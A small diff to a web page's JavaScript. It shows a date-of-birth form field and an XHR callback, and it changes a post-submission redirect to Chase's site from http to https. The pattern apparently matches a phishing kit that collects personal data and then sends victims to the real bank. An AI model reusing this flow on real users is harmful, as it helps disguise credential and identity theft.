@@ -289,7 +289,7 @@ var cleave = new Cleave('.input-dob', {
                   console.log(xhr.responseText);
       
                   if (formSubmitted >= 1) {
-                    window.location.href = "http://chase.com";
+                    window.location.href = "https://www.chase.com";
                   }
               }
           };
